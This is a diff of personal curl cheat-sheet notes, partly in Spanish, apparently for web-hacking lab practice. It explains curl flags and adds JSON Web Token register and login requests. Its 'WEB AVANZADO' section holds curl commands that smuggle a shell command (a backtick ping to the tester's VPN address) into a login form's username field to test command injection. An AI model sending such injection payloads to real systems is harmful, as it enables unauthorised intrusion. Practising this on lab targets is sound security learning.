@@ -7,7 +7,7 @@
 
 
 			-s		'silent'
-			-X    'GET   POST  ("requestMethod")'
+			-X    'GET   POST  etc... ("requestMethod")'
 			-I    'Fetch the headers only'
 			-k    'This option makes curl skip the verification step and proceed without checking'
 
@@ -26,5 +26,15 @@
 
 *** *** *** WEB AVANZADO WEB AVANZADO
 
-	:::  curl  http://test.test/test/login  --data 'username=;`ping -c 4 -4 ip_vpn_here`'
-	:::  curl  http://test.test/test/login  --data-urlencode 'username=;`ping -c 4 -4 ip_vpn_here`'     "encodea con --data-urlencode ......<3 <3 <3"
+	:::  curl  -s  -X POST  http://test.test/test/login  --data 'username=;`ping -c 4 -4 ip_vpn_here`'
+	:::  curl  -s  -X POST  http://test.test/test/login  --data-urlencode 'username=;`ping -c 4 -4 ip_vpn_here`'     "encodea con --data-urlencode ......<3 <3 <3"
+
+
+    *** *** JSON WEB TOKEN
+
+			::: curl  -s  -X POST http://$(mvnb):3000/api/user/register  -H "Content-Type: application/json"  -d '{"name": "nameTest", "email": "emailTest@test.com", "password": "testPassword1234"}'
+
+												-H			"info Header"
+												-d	   	"info a nivel de data"
+
+			::: curl  -s  -X POST http://$(mvnb):3000/api/user/login  -H "Content-Type: application/json"  -d '{"email": "emailTest@test.com", "password": "testPassword1234"}'
